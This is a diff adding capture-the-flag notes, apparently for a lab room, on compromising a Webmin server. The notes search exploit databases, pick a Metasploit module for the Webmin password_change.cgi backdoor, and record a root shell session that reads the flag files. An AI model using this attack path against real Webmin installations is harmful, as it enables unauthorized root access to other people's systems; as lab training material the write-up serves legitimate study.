@@ -1,0 +1,66 @@
+IP : 10.10.225.222
+Open Ports : 22, 10000
+
+Port 10000 has webmin login console.
+
+Search exploitdb with webmin:
+
+	we found exploits like:
+		Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)
+		Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)
+
+Lets check that out...
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
+   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
+
+
+Lets use 2nd one
+
+Set RHOSTS, LHOST and SSL(As the Webmin login we found was over SSL)
+
+Run the exploit.
+
+We are in and have root access. Just get the flags!!!
+
+shell                                                                                                               
+[*] Trying to find binary(python) on target machine                                                                 
+[*] Found python at /usr/bin/python                                                                                 
+[*] Using `python` to pop up an interactive shell                                                                   
+[*] Trying to find binary(bash) on target machine                                                                   
+[*] Found bash at /bin/bash                                                                                         
+whoami                                                                                                              
+whoami                                                                                                              
+root                                                                                                                
+root@source:/usr/share/webmin/# cd /                                                                                
+cd /                                                                                                                
+root@source:/# ls                                                                                                   
+ls                                                                                                                  
+bin    etc             lib         mnt   run   swap.img  var                                                        
+boot   home            lib64       opt   sbin  sys       vmlinuz                                                    
+cdrom  initrd.img      lost+found  proc  snap  tmp       vmlinuz.old
+dev    initrd.img.old  media       root  srv   usr       webmin-setup.out
+root@source:/# ls /home
+ls /home
+dark
+root@source:/# ls /home/dark
+ls /home/dark
+user.txt  webmin_1.890_all.deb
+root@source:/# cat /home/dark/user.txt
+cat /home/dark/user.txt
+THM{SUPPLY_CHAIN_COMPROMISE}
+root@source:/# ls /root      
+ls /root                     
+root.txt                     
+root@source:/# cat /root/root.txt
+cat /root/root.txt
+THM{UPDATE_YOUR_INSTALL}
